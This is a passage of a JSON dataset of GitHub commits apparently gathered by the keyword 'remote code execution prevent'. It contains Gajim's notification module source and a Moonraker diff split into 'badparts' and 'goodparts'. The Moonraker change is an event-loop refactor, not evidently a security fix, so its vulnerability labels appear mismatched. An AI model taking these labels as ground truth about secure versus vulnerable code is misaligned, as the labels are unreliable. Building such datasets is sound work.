notification=pynotify.Notification(_title, _text) timeout=gajim.config.get('notification_timeout') * 1000 notification.set_timeout(timeout) notification.set_category(event_type) notification.set_data('event_type', event_type) notification.set_data('jid', jid) notification.set_data('account', account) notification.set_data('msg_type', msg_type) notification.set_property('icon-name', path_to_image) if 'actions' in pynotify.get_server_caps(): notification.add_action('default', 'Default Action', on_pynotify_notification_clicked) try: notification.show() return except gobject.GError, e: gajim.log.debug(str(e)) instance=PopupNotificationWindow(event_type, jid, account, msg_type, path_to_image, title, text) gajim.interface.roster.popup_notification_windows.append(instance) def on_pynotify_notification_clicked(notification, action): jid=notification.get_data('jid') account=notification.get_data('account') msg_type=notification.get_data('msg_type') notification.close() gajim.interface.handle_event(account, jid, msg_type) class Notification: \"\"\" Handle notifications \"\"\" def __init__(self): gajim.ged.register_event_handler('notification', ged.GUI2, self._nec_notification) def _nec_notification(self, obj): if obj.do_popup: popup(obj.popup_event_type, obj.jid, obj.conn.name, obj.popup_msg_type, path_to_image=obj.popup_image, title=obj.popup_title, text=obj.popup_text) if obj.do_sound: if obj.sound_file: helpers.play_sound_file(obj.sound_file) elif obj.sound_event: helpers.play_sound(obj.sound_event) if obj.do_command: try: helpers.exec_command(obj.command) except Exception: pass class NotificationResponseManager: \"\"\" Collect references to pending DesktopNotifications and manages there signalling. This is necessary due to a bug in DBus where you can't remove a signal from an interface once it's connected \"\"\" def __init__(self): self.pending={} self.received=[] self.interface=None def attach_to_interface(self): if self.interface is not None: return self.interface=dbus_support.get_notifications_interface() self.interface.connect_to_signal('ActionInvoked', self.on_action_invoked) self.interface.connect_to_signal('NotificationClosed', self.on_closed) def on_action_invoked(self, id_, reason): if id_ in self.pending: notification=self.pending[id_] notification.on_action_invoked(id_, reason) del self.pending[id_] return self.received.append((id_, time.time(), reason)) if len(self.received) > 20: curt=time.time() for rec in self.received: diff=curt -rec[1] if diff > 10: self.received.remove(rec) def on_closed(self, id_, reason=None): if id_ in self.pending: del self.pending[id_] def add_pending(self, id_, object_): for rec in self.received: if rec[0]==id_: object_.on_action_invoked(id_, rec[2]) self.received.remove(rec) return if id_ not in self.pending: self.pending[id_]=object_ else: gajim.log.debug('Duplicate ID of notification. Can\\'t handle this.') notification_response_manager=NotificationResponseManager() class DesktopNotification: \"\"\" A DesktopNotification that interfaces with D-Bus via the Desktop Notification Specification \"\"\" def __init__(self, event_type, jid, account, msg_type='', path_to_image=None, title=None, text=None): self.path_to_image=os.path.abspath(path_to_image) self.event_type=event_type self.title=title self.text=text self.default_version=[0, 3, 1] self.account=account self.jid=jid self.msg_type=msg_type if not text and event_type=='new_message': self.text=gajim.get_name_from_jid(account, jid) if not title: self.title=event_type if event_type==_('Contact Signed In'): ntype='presence.online' elif event_type==_('Contact Signed Out'): ntype='presence.offline' elif event_type in(_('New Message'), _('New Single Message'), _('New Private Message')): ntype='im.received' elif event_type==_('File Transfer Request'): ntype='transfer' elif event_type==_('File Transfer Error'): ntype='transfer.error' elif event_type in(_('File Transfer Completed'), _('File Transfer Stopped')): ntype='transfer.complete' elif event_type==_('New E-mail'): ntype='email.arrived' elif event_type==_('Groupchat Invitation'): ntype='im.invitation' elif event_type==_('Contact Changed Status'): ntype='presence.status' elif event_type==_('Connection Failed'): ntype='connection.failed' elif event_type==_('Subscription request'): ntype='subscription.request' elif event_type==_('Unsubscribed'): ntype='unsubscribed' else: self.path_to_image=gtkgui_helpers.get_icon_path( 'gajim-chat_msg_recv', 48) ntype='im' self.notif=dbus_support.get_notifications_interface(self) if self.notif is None: raise dbus.DBusException('unable to get notifications interface') self.ntype=ntype if self.kde_notifications: self.attempt_notify() else: self.capabilities=self.notif.GetCapabilities() if self.capabilities is None: self.capabilities=['actions'] self.get_version() def attempt_notify(self): timeout=gajim.config.get('notification_timeout') ntype=self.ntype if self.kde_notifications: notification_text=('<html><img src=\"%(image)s\" align=left \/>' \\ '%(title)s<br\/>%(text)s<\/html>') %{'title': self.title, 'text': self.text, 'image': self.path_to_image} gajim_icon=gtkgui_helpers.get_icon_path('gajim', 48) try: self.notif.Notify( dbus.String(_('Gajim')), dbus.UInt32(0), ntype, dbus.String(gajim_icon), dbus.String(''), dbus.String(notification_text), (dbus.String('default'), dbus.String(self.event_type), dbus.String('ignore'), dbus.String(_('Ignore'))), [], dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) return except Exception: pass version=self.version if version[:2]==[0, 2]: actions={} if 'actions' in self.capabilities: actions={'default': 0} try: self.notif.Notify( dbus.String(_('Gajim')), dbus.String(self.path_to_image), dbus.UInt32(0), ntype, dbus.Byte(0), dbus.String(self.title), dbus.String(self.text), [dbus.String(self.path_to_image)], actions, [''], True, dbus.UInt32(timeout), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except AttributeError: version=[0, 3, 1] if version >[0, 3]: if gajim.interface.systray_enabled and \\ gajim.config.get('attach_notifications_to_systray'): status_icon=gajim.interface.systray.status_icon x, y, width, height=status_icon.get_geometry()[1] pos_x=x +(width \/ 2) pos_y=y +(height \/ 2) hints={'x': pos_x, 'y': pos_y} else: hints={} if version >=[0, 3, 2]: hints['urgency']=dbus.Byte(0) hints['category']=dbus.String(ntype) if self.text: text=self.text if len(self.text) > 200: text='%s\\n...' % self.text[:200] else: text=' ' if os.environ.get('KDE_FULL_SESSION')=='true': text='<table style=\\'padding: 3px\\'><tr><td>' \\ '<img src=\\\"%s\\\"><\/td><td width=20> <\/td>' \\ '<td>%s<\/td><\/tr><\/table>' %(self.path_to_image, text) self.path_to_image=os.path.abspath( gtkgui_helpers.get_icon_path('gajim', 48)) actions=() if 'actions' in self.capabilities: actions=(dbus.String('default'), dbus.String( self.event_type)) try: self.notif.Notify( dbus.String(_('Gajim')), dbus.UInt32(0), dbus.String(self.path_to_image), dbus.String(self.title), dbus.String(text), actions, hints, dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except Exception, e: self.notify_another_way(e) else: try: self.notif.Notify( dbus.String(_('Gajim')), dbus.String(self.path_to_image), dbus.UInt32(0), dbus.String(self.title), dbus.String(self.text), dbus.String(''), hints, dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except Exception, e: self.notify_another_way(e) def attach_by_id(self, id_): notification_response_manager.attach_to_interface() notification_response_manager.add_pending(id_, self) def notify_another_way(self, e): gajim.log.debug('Error when trying to use notification daemon: %s' % \\ str(e)) instance=PopupNotificationWindow(self.event_type, self.jid, self.account, self.msg_type, self.path_to_image, self.title, self.text) gajim.interface.roster.popup_notification_windows.append(instance) def on_action_invoked(self, id_, reason): if self.notif is None: return self.notif.CloseNotification(dbus.UInt32(id_)) self.notif=None if reason=='ignore': return gajim.interface.handle_event(self.account, self.jid, self.msg_type) def version_reply_handler(self, name, vendor, version, spec_version=None): if spec_version: version=spec_version elif vendor=='Xfce' and version.startswith('0.1.0'): version='0.9' version_list=version.split('.') self.version=[] try: while len(version_list): self.version.append(int(version_list.pop(0))) except ValueError: self.version_error_handler_3_x_try(None) self.attempt_notify() def get_version(self): self.notif.GetServerInfo( reply_handler=self.version_reply_handler, error_handler=self.version_error_handler_2_x_try) def version_error_handler_2_x_try(self, e): self.notif.GetServerInformation( reply_handler=self.version_reply_handler, error_handler=self.version_error_handler_3_x_try) def version_error_handler_3_x_try(self, e): self.version=self.default_version self.attempt_notify() ","sourceWithComments":"# -*- coding:utf-8 -*-\n## src\/notify.py\n##\n## Copyright (C) 2005 Sebastian Estienne\n## Copyright (C) 2005-2006 Andrew Sayman <lorien420 AT myrealbox.com>\n## Copyright (C) 2005-2007 Nikos Kouremenos <kourem AT gmail.com>\n## Copyright (C) 2005-2010 Yann Leboulanger <asterix AT lagaule.org>\n## Copyright (C) 2006 Travis Shirk <travis AT pobox.com>\n## Copyright (C) 2006-2008 Jean-Marie Traissard <jim AT lapin.org>\n## Copyright (C) 2007 Julien Pivotto <roidelapluie AT gmail.com>\n##                    Stephan Erb <steve-e AT h3c.de>\n## Copyright (C) 2008 Brendan Taylor <whateley AT gmail.com>\n##                    Jonathan Schleifer <js-gajim AT webkeks.org>\n##\n## This file is part of Gajim.\n##\n## Gajim is free software; you can redistribute it and\/or modify\n## it under the terms of the GNU General Public License as published\n## by the Free Software Foundation; version 3 only.\n##\n## Gajim is distributed in the hope that it will be useful,\n## but WITHOUT ANY WARRANTY; without even the implied warranty of\n## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n## GNU General Public License for more details.\n##\n## You should have received a copy of the GNU General Public License\n## along with Gajim. If not, see <http:\/\/www.gnu.org\/licenses\/>.\n##\n\nimport os\nimport time\nfrom dialogs import PopupNotificationWindow\nimport gobject\nimport gtkgui_helpers\nimport gtk\n\nfrom common import gajim\nfrom common import helpers\nfrom common import ged\n\nfrom common import dbus_support\nif dbus_support.supported:\n    import dbus\n    import dbus.glib\n\n\nUSER_HAS_PYNOTIFY = True # user has pynotify module\ntry:\n    import pynotify\n    pynotify.init('Gajim Notification')\nexcept ImportError:\n    USER_HAS_PYNOTIFY = False\n\ndef get_show_in_roster(event, account, contact, session=None):\n    \"\"\"\n    Return True if this event must be shown in roster, else False\n    \"\"\"\n    if event == 'gc_message_received':\n        return True\n    if event == 'message_received':\n        if session and session.control:\n            return False\n    return True\n\ndef get_show_in_systray(event, account, contact, type_=None):\n    \"\"\"\n    Return True if this event must be shown in systray, else False\n    \"\"\"\n    if type_ == 'printed_gc_msg' and not gajim.config.get(\n    'notify_on_all_muc_messages'):\n        # it's not an highlighted message, don't show in systray\n        return False\n    return gajim.config.get('trayicon_notification_on_events')\n\ndef popup(event_type, jid, account, msg_type='', path_to_image=None, title=None,\ntext=None):\n    \"\"\"\n    Notify a user of an event. It first tries to a valid implementation of\n    the Desktop Notification Specification. If that fails, then we fall back to\n    the older style PopupNotificationWindow method\n    \"\"\"\n    # default image\n    if not path_to_image:\n        path_to_image = gtkgui_helpers.get_icon_path('gajim-chat_msg_recv', 48)\n\n    # Try to show our popup via D-Bus and notification daemon\n    if gajim.config.get('use_notif_daemon') and dbus_support.supported:\n        try:\n            DesktopNotification(event_type, jid, account, msg_type,\n                path_to_image, title, gobject.markup_escape_text(text))\n            return  # sucessfully did D-Bus Notification procedure!\n        except dbus.DBusException, e:\n            # Connection to D-Bus failed\n            gajim.log.debug(str(e))\n        except TypeError, e:\n            # This means that we sent the message incorrectly\n            gajim.log.debug(str(e))\n\n    # Ok, that failed. Let's try pynotify, which also uses notification daemon\n    if gajim.config.get('use_notif_daemon') and USER_HAS_PYNOTIFY:\n        if not text and event_type == 'new_message':\n            # empty text for new_message means do_preview = False\n            # -> default value for text\n            _text = gobject.markup_escape_text(\n                gajim.get_name_from_jid(account, jid))\n        else:\n            _text = gobject.markup_escape_text(text)\n\n        if not title:\n            _title = ''\n        else:\n            _title = title\n\n        notification = pynotify.Notification(_title, _text)\n        timeout = gajim.config.get('notification_timeout') * 1000 # make it ms\n        notification.set_timeout(timeout)\n\n        notification.set_category(event_type)\n        notification.set_data('event_type', event_type)\n        notification.set_data('jid', jid)\n        notification.set_data('account', account)\n        notification.set_data('msg_type', msg_type)\n        notification.set_property('icon-name', path_to_image)\n        if 'actions' in pynotify.get_server_caps():\n            notification.add_action('default', 'Default Action',\n                    on_pynotify_notification_clicked)\n\n        try:\n            notification.show()\n            return\n        except gobject.GError, e:\n            # Connection to notification-daemon failed, see #2893\n            gajim.log.debug(str(e))\n\n    # Either nothing succeeded or the user wants old-style notifications\n    instance = PopupNotificationWindow(event_type, jid, account, msg_type,\n        path_to_image, title, text)\n    gajim.interface.roster.popup_notification_windows.append(instance)\n\ndef on_pynotify_notification_clicked(notification, action):\n    jid = notification.get_data('jid')\n    account = notification.get_data('account')\n    msg_type = notification.get_data('msg_type')\n\n    notification.close()\n    gajim.interface.handle_event(account, jid, msg_type)\n\nclass Notification:\n    \"\"\"\n    Handle notifications\n    \"\"\"\n    def __init__(self):\n        gajim.ged.register_event_handler('notification', ged.GUI2,\n            self._nec_notification)\n\n    def _nec_notification(self, obj):\n        if obj.do_popup:\n            popup(obj.popup_event_type, obj.jid, obj.conn.name,\n                obj.popup_msg_type, path_to_image=obj.popup_image,\n                title=obj.popup_title, text=obj.popup_text)\n\n        if obj.do_sound:\n            if obj.sound_file:\n                helpers.play_sound_file(obj.sound_file)\n            elif obj.sound_event:\n                helpers.play_sound(obj.sound_event)\n\n        if obj.do_command:\n            try:\n                helpers.exec_command(obj.command)\n            except Exception:\n                pass\n\nclass NotificationResponseManager:\n    \"\"\"\n    Collect references to pending DesktopNotifications and manages there\n    signalling. This is necessary due to a bug in DBus where you can't remove a\n    signal from an interface once it's connected\n    \"\"\"\n\n    def __init__(self):\n        self.pending = {}\n        self.received = []\n        self.interface = None\n\n    def attach_to_interface(self):\n        if self.interface is not None:\n            return\n        self.interface = dbus_support.get_notifications_interface()\n        self.interface.connect_to_signal('ActionInvoked',\n            self.on_action_invoked)\n        self.interface.connect_to_signal('NotificationClosed', self.on_closed)\n\n    def on_action_invoked(self, id_, reason):\n        if id_ in self.pending:\n            notification = self.pending[id_]\n            notification.on_action_invoked(id_, reason)\n            del self.pending[id_]\n            return\n        # got an action on popup that isn't handled yet? Maybe user clicked too\n        # fast. Remember it.\n        self.received.append((id_, time.time(), reason))\n        if len(self.received) > 20:\n            curt = time.time()\n            for rec in self.received:\n                diff = curt - rec[1]\n                if diff > 10:\n                    self.received.remove(rec)\n\n    def on_closed(self, id_, reason=None):\n        if id_ in self.pending:\n            del self.pending[id_]\n\n    def add_pending(self, id_, object_):\n        # Check to make sure that we handle an event immediately if we're adding\n        # an id that's already been triggered\n        for rec in self.received:\n            if rec[0] == id_:\n                object_.on_action_invoked(id_, rec[2])\n                self.received.remove(rec)\n                return\n        if id_ not in self.pending:\n            # Add it\n            self.pending[id_] = object_\n        else:\n            # We've triggered an event that has a duplicate ID!\n            gajim.log.debug('Duplicate ID of notification. Can\\'t handle this.')\n\nnotification_response_manager = NotificationResponseManager()\n\nclass DesktopNotification:\n    \"\"\"\n    A DesktopNotification that interfaces with D-Bus via the Desktop\n    Notification Specification\n    \"\"\"\n\n    def __init__(self, event_type, jid, account, msg_type='',\n    path_to_image=None, title=None, text=None):\n        self.path_to_image = os.path.abspath(path_to_image)\n        self.event_type = event_type\n        self.title = title\n        self.text = text\n        # 0.3.1 is the only version of notification daemon that has no way\n        # to determine which version it is. If no method exists, it means\n        # they're using that one.\n        self.default_version = [0, 3, 1]\n        self.account = account\n        self.jid = jid\n        self.msg_type = msg_type\n\n        # default value of text\n        if not text and event_type == 'new_message':\n            # empty text for new_message means do_preview = False\n            self.text = gajim.get_name_from_jid(account, jid)\n\n        if not title:\n            self.title = event_type # default value\n\n        if event_type == _('Contact Signed In'):\n            ntype = 'presence.online'\n        elif event_type == _('Contact Signed Out'):\n            ntype = 'presence.offline'\n        elif event_type in (_('New Message'), _('New Single Message'),\n        _('New Private Message')):\n            ntype = 'im.received'\n        elif event_type == _('File Transfer Request'):\n            ntype = 'transfer'\n        elif event_type == _('File Transfer Error'):\n            ntype = 'transfer.error'\n        elif event_type in (_('File Transfer Completed'),\n        _('File Transfer Stopped')):\n            ntype = 'transfer.complete'\n        elif event_type == _('New E-mail'):\n            ntype = 'email.arrived'\n        elif event_type == _('Groupchat Invitation'):\n            ntype = 'im.invitation'\n        elif event_type == _('Contact Changed Status'):\n            ntype = 'presence.status'\n        elif event_type == _('Connection Failed'):\n            ntype = 'connection.failed'\n        elif event_type == _('Subscription request'):\n            ntype = 'subscription.request'\n        elif event_type == _('Unsubscribed'):\n            ntype = 'unsubscribed'\n        else:\n            # default failsafe values\n            self.path_to_image = gtkgui_helpers.get_icon_path(\n                'gajim-chat_msg_recv', 48)\n            ntype = 'im' # Notification Type\n\n        self.notif = dbus_support.get_notifications_interface(self)\n        if self.notif is None:\n            raise dbus.DBusException('unable to get notifications interface')\n        self.ntype = ntype\n\n        if self.kde_notifications:\n            self.attempt_notify()\n        else:\n            self.capabilities = self.notif.GetCapabilities()\n            if self.capabilities is None:\n                self.capabilities = ['actions']\n            self.get_version()\n\n    def attempt_notify(self):\n        timeout = gajim.config.get('notification_timeout') # in seconds\n        ntype = self.ntype\n        if self.kde_notifications:\n            notification_text = ('<html><img src=\"%(image)s\" align=left \/>' \\\n                '%(title)s<br\/>%(text)s<\/html>') % {'title': self.title,\n                'text': self.text, 'image': self.path_to_image}\n            gajim_icon = gtkgui_helpers.get_icon_path('gajim', 48)\n            try:\n                self.notif.Notify(\n                    dbus.String(_('Gajim')),        # app_name (string)\n                    dbus.UInt32(0),                 # replaces_id (uint)\n                    ntype,                          # event_id (string)\n                    dbus.String(gajim_icon),        # app_icon (string)\n                    dbus.String(''),                # summary (string)\n                    dbus.String(notification_text), # body (string)\n                    # actions (stringlist)\n                    (dbus.String('default'), dbus.String(self.event_type),\n                    dbus.String('ignore'), dbus.String(_('Ignore'))),\n                    [],                                                                             # hints (not used in KDE yet)\n                    dbus.UInt32(timeout*1000),      # timeout (int), in ms\n                    reply_handler=self.attach_by_id,\n                    error_handler=self.notify_another_way)\n                return\n            except Exception:\n                pass\n        version = self.version\n        if version[:2] == [0, 2]:\n            actions = {}\n            if 'actions' in self.capabilities:\n                actions = {'default': 0}\n            try:\n                self.notif.Notify(\n                    dbus.String(_('Gajim')),\n                    dbus.String(self.path_to_image),\n                    dbus.UInt32(0),\n                    ntype,\n                    dbus.Byte(0),\n                    dbus.String(self.title),\n                    dbus.String(self.text),\n                    [dbus.String(self.path_to_image)],\n                    actions,\n                    [''],\n                    True,\n                    dbus.UInt32(timeout),\n                    reply_handler=self.attach_by_id,\n                    error_handler=self.notify_another_way)\n            except AttributeError:\n                # we're actually dealing with the newer version\n                version = [0, 3, 1]\n        if version > [0, 3]:\n            if gajim.interface.systray_enabled and \\\n            gajim.config.get('attach_notifications_to_systray'):\n                status_icon = gajim.interface.systray.status_icon\n                x, y, width, height = status_icon.get_geometry()[1]\n                pos_x = x + (width \/ 2)\n                pos_y = y + (height \/ 2)\n                hints = {'x': pos_x, 'y': pos_y}\n            else:\n                hints = {}\n            if version >= [0, 3, 2]:\n                hints['urgency'] = dbus.Byte(0) # Low Urgency\n                hints['category'] = dbus.String(ntype)\n                # it seems notification-daemon doesn't like empty text\n                if self.text:\n                    text = self.text\n                    if len(self.text) > 200:\n                        text = '%s\\n...' % self.text[:200]\n                else:\n                    text = ' '\n                if os.environ.get('KDE_FULL_SESSION') == 'true':\n                    text = '<table style=\\'padding: 3px\\'><tr><td>' \\\n                        '<img src=\\\"%s\\\"><\/td><td width=20> <\/td>' \\\n                        '<td>%s<\/td><\/tr><\/table>' % (self.path_to_image,\n                        text)\n                    self.path_to_image = os.path.abspath(\n                        gtkgui_helpers.get_icon_path('gajim', 48))\n                actions = ()\n                if 'actions' in self.capabilities:\n                    actions = (dbus.String('default'), dbus.String(\n                        self.event_type))\n                try:\n                    self.notif.Notify(\n                        dbus.String(_('Gajim')),\n                        # this notification does not replace other\n                        dbus.UInt32(0),\n                        dbus.String(self.path_to_image),\n                        dbus.String(self.title),\n                        dbus.String(text),\n                        actions,\n                        hints,\n                        dbus.UInt32(timeout*1000),\n                        reply_handler=self.attach_by_id,\n                        error_handler=self.notify_another_way)\n                except Exception, e:\n                    self.notify_another_way(e)\n            else:\n                try:\n                    self.notif.Notify(\n                        dbus.String(_('Gajim')),\n                        dbus.String(self.path_to_image),\n                        dbus.UInt32(0),\n                        dbus.String(self.title),\n                        dbus.String(self.text),\n                        dbus.String(''),\n                        hints,\n                        dbus.UInt32(timeout*1000),\n                        reply_handler=self.attach_by_id,\n                        error_handler=self.notify_another_way)\n                except Exception, e:\n                    self.notify_another_way(e)\n\n    def attach_by_id(self, id_):\n        notification_response_manager.attach_to_interface()\n        notification_response_manager.add_pending(id_, self)\n\n    def notify_another_way(self, e):\n        gajim.log.debug('Error when trying to use notification daemon: %s' % \\\n            str(e))\n        instance = PopupNotificationWindow(self.event_type, self.jid,\n            self.account, self.msg_type, self.path_to_image, self.title,\n            self.text)\n        gajim.interface.roster.popup_notification_windows.append(instance)\n\n    def on_action_invoked(self, id_, reason):\n        if self.notif is None:\n            return\n        self.notif.CloseNotification(dbus.UInt32(id_))\n        self.notif = None\n\n        if reason == 'ignore':\n            return\n\n        gajim.interface.handle_event(self.account, self.jid, self.msg_type)\n\n    def version_reply_handler(self, name, vendor, version, spec_version=None):\n        if spec_version:\n            version = spec_version\n        elif vendor == 'Xfce' and version.startswith('0.1.0'):\n            version = '0.9'\n        version_list = version.split('.')\n        self.version = []\n        try:\n            while len(version_list):\n                self.version.append(int(version_list.pop(0)))\n        except ValueError:\n            self.version_error_handler_3_x_try(None)\n        self.attempt_notify()\n\n    def get_version(self):\n        self.notif.GetServerInfo(\n            reply_handler=self.version_reply_handler,\n            error_handler=self.version_error_handler_2_x_try)\n\n    def version_error_handler_2_x_try(self, e):\n        self.notif.GetServerInformation(\n            reply_handler=self.version_reply_handler,\n            error_handler=self.version_error_handler_3_x_try)\n\n    def version_error_handler_3_x_try(self, e):\n        self.version = self.default_version\n        self.attempt_notify()\n"}},"msg":"execute commands without use_shell=True to prevent remote code execution, except for commands configured in triggers plugin (configured by user itself). Fixes #7031"}},"https:\/\/github.com\/CrealityTech\/moonraker_ys":{"6dfab37ef856fade2839dd0315db4f2d25284947":{"url":"https:\/\/api.github.com\/repos\/CrealityTech\/moonraker_ys\/commits\/6dfab37ef856fade2839dd0315db4f2d25284947","html_url":"https:\/\/github.com\/CrealityTech\/moonraker_ys\/commit\/6dfab37ef856fade2839dd0315db4f2d25284947","message":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>","sha":"6dfab37ef856fade2839dd0315db4f2d25284947","keyword":"remote code execution prevent","diff":"diff --git a\/moonraker\/moonraker.py b\/moonraker\/moonraker.py\nindex e438602..7e0a9ed 100644\n--- a\/moonraker\/moonraker.py\n+++ b\/moonraker\/moonraker.py\n@@ -183,10 +183,10 @@ def process_command(self, cmd):\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n@@ -207,6 +207,14 @@ def process_command(self, cmd):\n             result = ServerError(err, 400)\n         request.notify(result)\n \n+    async def _execute_method(self, method_name, **kwargs):\n+        try:\n+            ret = self.remote_methods[method_name](**kwargs)\n+            if asyncio.iscoroutine(ret):\n+                await ret\n+        except Exception:\n+            logging.exception(f\"Error running remote method: {method_name}\")\n+\n     def on_connection_closed(self):\n         self.init_list = []\n         self.klippy_state = \"disconnected\"\n","files":{"\/moonraker\/moonraker.py":{"changes":[{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]},{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]}],"source":"\n import argparse import sys import importlib import os import time import socket import logging import json import confighelper import utils import asyncio from tornado import iostream, gen from tornado.ioloop import IOLoop from tornado.util import TimeoutError from tornado.locks import Event from app import MoonrakerApp from utils import ServerError INIT_TIME=.25 LOG_ATTEMPT_INTERVAL=int(2. \/ INIT_TIME +.5) MAX_LOG_ATTEMPTS=10 * LOG_ATTEMPT_INTERVAL CORE_PLUGINS=[ 'file_manager', 'klippy_apis', 'machine', 'data_store', 'shell_command'] class Sentinel: pass class Server: error=ServerError def __init__(self, args): config=confighelper.get_configuration(self, args) self.host=config.get('host', \"0.0.0.0\") self.port=config.getint('port', 7125) self.events={} self.klippy_address=config.get( 'klippy_uds_address', \"\/tmp\/klippy_uds\") self.klippy_connection=KlippyConnection( self.process_command, self.on_connection_closed) self.init_list=[] self.init_handle=None self.init_attempts=0 self.klippy_state=\"disconnected\" self.all_subscriptions={} self.server_running=False self.moonraker_app=app=MoonrakerApp(config) self.register_endpoint=app.register_local_handler self.register_static_file_handler=app.register_static_file_handler self.register_upload_handler=app.register_upload_handler self.ioloop=IOLoop.current() self.register_endpoint( \"\/server\/info\",['GET'], self._handle_info_request) self.register_endpoint( \"\/server\/restart\",['POST'], self._handle_server_restart) self.pending_requests={} self.remote_methods={} self.klippy_reg_methods=[] self.register_remote_method( 'process_gcode_response', self._process_gcode_response, need_klippy_reg=False) self.register_remote_method( 'process_status_update', self._process_status_update, need_klippy_reg=False) self.plugins={} self.klippy_apis=self.load_plugin(config, 'klippy_apis') self._load_plugins(config) def start(self): hostname, hostport=self.get_host_info() logging.info( f\"Starting Moonraker on({self.host},{hostport}), \" f\"Hostname:{hostname}\") self.moonraker_app.listen(self.host, self.port) self.server_running=True self.ioloop.spawn_callback(self._connect_klippy) def _load_plugins(self, config): for plugin in CORE_PLUGINS: self.load_plugin(config, plugin) opt_sections=set(config.sections()) -\\ set(['server', 'authorization', 'cmd_args']) for section in opt_sections: self.load_plugin(config, section, None) def load_plugin(self, config, plugin_name, default=Sentinel): if plugin_name in self.plugins: return self.plugins[plugin_name] mod_path=os.path.join( os.path.dirname(__file__), 'plugins', plugin_name +'.py') if not os.path.exists(mod_path): msg=f\"Plugin({plugin_name}) does not exist\" logging.info(msg) if default==Sentinel: raise ServerError(msg) return default module=importlib.import_module(\"plugins.\" +plugin_name) try: if plugin_name not in CORE_PLUGINS: config=config[plugin_name] load_func=getattr(module, \"load_plugin\") plugin=load_func(config) except Exception: msg=f\"Unable to load plugin({plugin_name})\" logging.exception(msg) if default==Sentinel: raise ServerError(msg) return default self.plugins[plugin_name]=plugin logging.info(f\"Plugin({plugin_name}) loaded\") return plugin def lookup_plugin(self, plugin_name, default=Sentinel): plugin=self.plugins.get(plugin_name, default) if plugin==Sentinel: raise ServerError(f\"Plugin({plugin_name}) not found\") return plugin def register_event_handler(self, event, callback): self.events.setdefault(event,[]).append(callback) def send_event(self, event, *args): events=self.events.get(event,[]) for evt in events: self.ioloop.spawn_callback(evt, *args) def register_remote_method(self, method_name, cb, need_klippy_reg=True): if method_name in self.remote_methods: logging.info(f\"Remote method({method_name}) already registered\") return self.remote_methods[method_name]=cb if need_klippy_reg: self.klippy_reg_methods.append(method_name) def get_host_info(self): hostname=socket.gethostname() return hostname, self.port async def _connect_klippy(self): if not self.server_running: return ret=await self.klippy_connection.connect(self.klippy_address) if not ret: self.ioloop.call_later(.25, self._connect_klippy) return self.ioloop.spawn_callback(self._initialize) def process_command(self, cmd): method=cmd.get('method', None) if method is not None: cb=self.remote_methods.get(method, None) if cb is not None: params=cmd.get('params',{}) cb(**params) else: logging.info(f\"Unknown method received:{method}\") return req_id=cmd.get('id', None) request=self.pending_requests.pop(req_id, None) if request is None: logging.info( f\"No request matching request ID:{req_id}, \" f\"response:{cmd}\") return if 'result' in cmd: result=cmd['result'] if not result: result=\"ok\" else: err=cmd.get('error', \"Malformed Klippy Response\") result=ServerError(err, 400) request.notify(result) def on_connection_closed(self): self.init_list=[] self.klippy_state=\"disconnected\" for request in self.pending_requests.values(): request.notify(ServerError(\"Klippy Disconnected\", 503)) self.pending_requests={} logging.info(\"Klippy Connection Removed\") self.send_event(\"server:klippy_disconnect\") if self.init_handle is not None: self.ioloop.remove_timeout(self.init_handle) if self.server_running: self.ioloop.call_later(.25, self._connect_klippy) async def _initialize(self): if not self.server_running: return await self._check_ready() await self._request_endpoints() if \"webhooks_sub\" not in self.init_list: temp_subs=self.all_subscriptions self.all_subscriptions={} try: await self.klippy_apis.subscribe_objects({'webhooks': None}) except ServerError as e: logging.info(f\"{e}\\nUnable to subscribe to webhooks object\") else: logging.info(\"Webhooks Subscribed\") self.init_list.append(\"webhooks_sub\") self.all_subscriptions.update(temp_subs) if \"gcode_output_sub\" not in self.init_list: try: await self.klippy_apis.subscribe_gcode_output() except ServerError as e: logging.info( f\"{e}\\nUnable to register gcode output subscription\") else: logging.info(\"GCode Output Subscribed\") self.init_list.append(\"gcode_output_sub\") if \"klippy_ready\" in self.init_list or \\ not self.klippy_connection.is_connected(): self.init_attempts=0 self.init_handle=None else: self.init_attempts +=1 self.init_handle=self.ioloop.call_later( INIT_TIME, self._initialize) async def _request_endpoints(self): result=await self.klippy_apis.list_endpoints(default=None) if result is None: return endpoints=result.get('endpoints',{}) for ep in endpoints: self.moonraker_app.register_remote_handler(ep) async def _check_ready(self): send_id=\"identified\" not in self.init_list try: result=await self.klippy_apis.get_klippy_info(send_id) except ServerError as e: if 